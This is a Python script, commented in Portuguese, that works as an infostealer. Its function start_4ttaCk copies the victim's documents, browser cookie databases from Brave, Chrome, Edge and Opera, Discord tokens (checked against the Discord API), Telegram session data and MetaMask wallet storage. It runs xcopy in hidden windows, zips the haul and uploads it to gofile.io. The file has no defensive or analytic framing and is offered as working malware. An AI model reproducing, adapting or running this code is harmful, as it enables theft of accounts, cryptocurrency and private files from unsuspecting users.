import os
import platform
import shutil
import requests
from re import findall
import subprocess

# Obter o caminho do usuário e nome do computador
home_path = os.path.expanduser("~")
pc_name = platform.uname()[1]

# Montar o caminho de armazenamento de forma portátil
save_path = os.path.join(home_path, pc_name)

# Criar o diretório se não existir
if not os.path.exists(save_path):
    os.mkdir(save_path)

def collect_files():
    global home_path
    global pc_name
    global save_path
    
    file_extensions = (".docx", ".txt", ".doc", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf")
    desktop_path = os.path.join(home_path, "Desktop")
    possible_document = os.path.join(home_path, "Documents")

    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith(file_extensions):
                source_path = os.path.join(root, file)
                relative_path = os.path.relpath(source_path, desktop_path)
                destination_dir = os.path.join(save_path, "dosyalar", os.path.dirname(relative_path))
                os.makedirs(destination_dir, exist_ok=True)
                destination_path = os.path.join(destination_dir, os.path.basename(file))
                shutil.copy(source_path, destination_path)

    for root, dirs, files in os.walk(possible_document):
        for file in files:
            if file.endswith(file_extensions):
                source_path = os.path.join(root, file)
                relative_path = os.path.relpath(source_path, possible_document)
                destination_dir = os.path.join(save_path, "dosyalar", os.path.dirname(relative_path))
                os.makedirs(destination_dir, exist_ok=True)
                destination_path = os.path.join(destination_dir, os.path.basename(file))
                shutil.copy(source_path, destination_path)

def browser():
    global home_path
    global pc_name
    global save_path

    brave_path = os.path.join(home_path, ".config", "BraveSoftware", "Brave-Browser", "Default", "Network", "Cookies")
    chrome_path = os.path.join(home_path, ".config", "Google", "Chrome", "Default", "Network", "Cookies")
    edge_path = os.path.join(home_path, ".config", "Microsoft", "Edge", "Default", "Network", "Cookies")
    opera_path = os.path.join(home_path, ".config", "Opera Software", "Opera Stable", "Network", "Cookies")
    
    # Copiar cookies se existirem
    if os.path.exists(brave_path):
        shutil.copy(brave_path, os.path.join(save_path, "brave_cookie"))
    if os.path.exists(chrome_path):
        shutil.copy(chrome_path, os.path.join(save_path, "chrome_cookie"))
    if os.path.exists(edge_path):
        shutil.copy(edge_path, os.path.join(save_path, "edge_cookie"))
    if os.path.exists(opera_path):
        shutil.copy(opera_path, os.path.join(save_path, "opera_cookie"))

def chatting_app():
    global home_path
    global pc_name
    global save_path

    d_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization": None
    }
    discord_path = os.path.join(home_path, ".config", "discord", "Local Storage", "leveldb")
    telegram_path = os.path.join(home_path, ".local", "share", "TelegramDesktop", "tdata")
    tokens = []

    try:
        # Verificar e extrair tokens do Discord
        if os.path.exists(discord_path):
            for file_name in os.listdir(discord_path):
                if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                    continue
                with open(os.path.join(discord_path, file_name), errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                tokens.append(token)
            for token in tokens:
                d_headers["Authorization"] = token
                r = requests.get("https://discordapp.com/api/v9/users/@me", headers=d_headers).text
                with open(os.path.join(save_path, "discord.txt"), "a") as f:
                    f.write("token=" + token + "\n")
                    f.write(r + "\n")
        # Verificar e copiar dados do Telegram
        if os.path.exists(telegram_path):
            subprocess.run(["xcopy", telegram_path, os.path.join(save_path, "Telegram", "tdata"), "/E", "/I", "/Y"], creationflags=0x08000000)
            subprocess.run(["xcopy", os.path.join(telegram_path, "user_data"), os.path.join(save_path, "Telegram", "tdata", "user_data"), "/E", "/I", "/Y"], creationflags=0x08000000)
    except PermissionError:
        return 0

def wallet():
    global home_path
    global pc_name
    global save_path

    brave_metamask = os.path.join(home_path, ".config", "BraveSoftware", "Brave-Browser", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
    chrome_metamask = os.path.join(home_path, ".config", "Google", "Chrome", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
    edge_metamask = os.path.join(home_path, ".config", "Microsoft", "Edge", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
    opera_metamask = os.path.join(home_path, ".config", "Opera Software", "Opera GX Stable", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
    
    try:
        if os.path.exists(brave_metamask):
            subprocess.run(["xcopy", brave_metamask, os.path.join(save_path, "brave_metamask"), "/E", "/I", "/Y"], creationflags=0x08000000)
        if os.path.exists(chrome_metamask):
            subprocess.run(["xcopy", chrome_metamask, os.path.join(save_path, "chrome_metamask"), "/E", "/I", "/Y"], creationflags=0x08000000)
        if os.path.exists(edge_metamask):
            subprocess.run(["xcopy", edge_metamask, os.path.join(save_path, "edge_metamask"), "/E", "/I", "/Y"], creationflags=0x08000000)
        if os.path.exists(opera_metamask):
            subprocess.run(["xcopy", opera_metamask, os.path.join(save_path, "opera_metamask"), "/E", "/I", "/Y"], creationflags=0x08000000)
    except PermissionError:
        return 0

def send_file(attachment_path, url):
    # Aqui você coloca sua lógica de envio, por exemplo:
    requests.post(
        url=f"https://store1.gofile.io/uploadFile",
        data={
            "token": "",  # seu token
            "folderId": ""  # seu folder id
        },
        files={"upload_file": open(attachment_path, "rb")}
    ).json()

def start_4ttaCk():
    global home_path
    global pc_name
    global save_path
    collect_files()
    browser()
    chatting_app()
    wallet()
    # Cria o arquivo zip do backup
    shutil.make_archive(os.path.join(home_path, pc_name), 'zip', save_path)
    # Envia o arquivo
    send_file(os.path.join(home_path, pc_name + ".zip"), "")

# Executa a função principal
start_4ttaCk()
